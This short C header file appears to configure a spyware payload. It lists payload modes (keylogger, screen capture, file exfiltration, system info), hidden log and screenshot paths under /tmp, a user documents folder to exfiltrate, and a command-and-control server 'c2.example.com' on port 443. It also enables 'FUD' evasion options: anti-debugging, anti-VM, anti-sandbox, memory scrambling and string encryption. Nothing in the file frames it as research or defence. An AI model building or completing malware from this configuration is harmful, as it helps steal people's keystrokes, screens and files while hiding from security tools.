#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload configuration options
#define PAYLOAD_TYPE 1 // 1: Keylogger, 2: Screen Capture, 3: File Exfiltration, 4: System Info
#define PAYLOAD_INTERVAL 60 // Seconds between payload executions
#define PAYLOAD_DURATION 300 // Total payload duration in seconds
#define PAYLOG_FILE "/tmp/.system.log" // Log file path
#define SCREENSHOT_DIR "/tmp/.screenshots" // Screenshot directory
#define EXFILTRATION_DIR "/home/user/Documents" // Directory to exfiltrate
#define C2_SERVER "c2.example.com" // C2 server address
#define C2_PORT 443 // C2 server port

// FUD configuration
#define ENABLE_ANTI_DEBUG 1
#define ENABLE_ANTI_VM 1
#define ENABLE_ANTI_SANDBOX 1
#define ENABLE_MEMORY_SCRAMBLING 1
#define ENABLE_STRING_ENCRYPTION 1

#endif // PAYLOAD_CONFIG_H